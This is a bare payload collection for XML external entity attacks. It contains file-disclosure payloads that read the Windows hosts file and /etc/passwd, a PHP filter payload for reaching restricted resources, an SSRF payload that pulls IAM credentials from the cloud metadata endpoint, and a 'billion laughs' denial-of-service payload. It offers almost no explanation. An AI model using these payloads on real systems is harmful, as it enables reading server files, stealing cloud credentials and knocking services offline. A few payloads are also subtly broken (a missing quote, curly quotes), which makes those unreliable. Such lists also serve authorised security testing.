XXE: Basic XML Example
----------------------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------

<!--?xml version="1.0" ?-->
<userInfo>
 <firstName>John</firstName>
 <lastName>Doe</lastName>
</userInfo>

----------------------------------------------------------------------------------------------------------------------------------------

XXE: File Disclosure:
----------------------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------

<!DOCTYPE name [
<!ENTITY read SYSTEM "file:///WINDOWS/system32/drivers/etc/hosts">
]> 
<contacts>
<name>&read;</name>
<num>123456</num>
<name>amgad</name>
<num>456789</num>
</contacts>

----------------------------------------------------------------------------------------------------------------------------------------

<!DOCTYPE root [ 
<!ENTITY read PUBLIC "payload" "file:///WINDOWS/system32/drivers/etc/hosts">
]>

<contacts>
<name>&read;</name>
<num>123456</num>
<name>amgad</name>
<num>456789</num>
</contacts>

----------------------------------------------------------------------------------------------------------------------------------------

Content-Type: text/xml                          //make sure xml Declaration is after the last header immediatly or it will throw an error 

<?xml version="1.0"?>
<!DOCTYPE root [ 
<!ENTITY read SYSTEM "file:///WINDOWS/system32/drivers/etc/hosts">
]>
<contacts>
<name>&read;</name>
<num>123456</num>
<name>amgad</name>
<num>456789</num>
</contacts>

----------------------------------------------------------------------------------------------------------------------------------------

Content-Type: text/xml                          //make sure xml Declaration is after the last header immediatly or it will throw an error 

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE root [ 
<!ENTITY read SYSTEM "file:///WINDOWS/system32/drivers/etc/hosts">
]>
<contacts>
<name>&read;</name>
<num>123456</num>
<name>amgad</name>
<num>456789</num>
</contacts>

----------------------------------------------------------------------------------------------------------------------------------------
Content-Type: text/xml                          //make sure xml Declaration is after the last header immediatly or it will throw an error 

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE root [ 
<!ENTITY read PUBLIC "anything" "file:///WINDOWS/system32/drivers/etc/hosts">
]>
<contacts>
<name>&read;</name>
<num>123456</num>
<name>amgad</name>
<num>456789</num>
</contacts>

----------------------------------------------------------------------------------------------------------------------------------------

XXE: Local File Inclusion Example

<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

----------------------------------------------------------------------------------------------------------------------------------------

XXE: Access Control Bypass (Loading Restricted Resources – PHP example)

<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]>
<foo><result>∾</result></foo>

----------------------------------------------------------------------------------------------------------------------------------------

XXE:SSRF ( Server Side Request Forgery ) Example

<?xml version=”1.0" encoding=”UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM “http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>

----------------------------------------------------------------------------------------------------------------------------------------

XXE: Denial-of-Service Example

<!--?xml version="1.0" ?-->
<!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
<tag>&lol9;</tag>

----------------------------------------------------------------------------------------------------------------------------------------